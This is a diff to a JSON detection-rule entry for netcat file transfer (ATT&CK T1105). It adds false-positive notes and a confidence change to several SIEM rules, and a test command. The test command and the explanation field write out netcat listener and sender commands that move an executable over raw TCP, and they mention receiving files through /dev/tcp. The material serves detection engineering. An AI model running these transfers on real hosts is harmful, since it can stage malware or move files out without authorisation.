@@ -109,7 +109,8 @@
           "T1105"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "IT admin tools, endpoint management agents, or security scanners performing similar actions"
       },
       {
         "platform": "splunk",
@@ -120,7 +121,8 @@
           "T1105"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Authorized admin commands, cron jobs, or configuration management tools (Ansible, Puppet)"
       },
       {
         "platform": "splunk",
@@ -134,7 +136,8 @@
         "confidence": "medium",
         "log_ids": [
           "3"
-        ]
+        ],
+        "false_positives": "Admin scripts, management agents, or IT tools launching similar processes"
       },
       {
         "platform": "sigma",
@@ -145,7 +148,8 @@
           "T1105"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Backup software, AV scans, or IT deployment tools creating similar files"
       },
       {
         "platform": "elastic",
@@ -155,7 +159,9 @@
         "attack": [
           "T1105"
         ],
-        "fidelity": "telemetry"
+        "fidelity": "telemetry",
+        "false_positives": "Legitimate admin tools or management agents performing similar endpoint operations",
+        "confidence": "low"
       }
     ],
     "visibility": {
@@ -191,7 +197,8 @@
         "Review Microsoft Defender for Endpoint, Linux Audit (auditd), Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "nc -l -p 8000 > out.exe   # receiver ; nc -q 0 <ip> 8000 < out.exe  # sender"
     }
   },
   "explain": "Moves a file over a raw TCP socket with netcat when no HTTP/SMB is available:\n  nc -l -p 8000 > out.exe   receiver: listen on 8000 and write incoming bytes to a file\n  nc -q 0 <ip> 8000 < out.exe   sender: connect and stream the file, then quit on EOF (-q 0)\nStart the receiver first; the file transfers with no protocol overhead (cat < /dev/tcp/... can receive without any nc binary)."
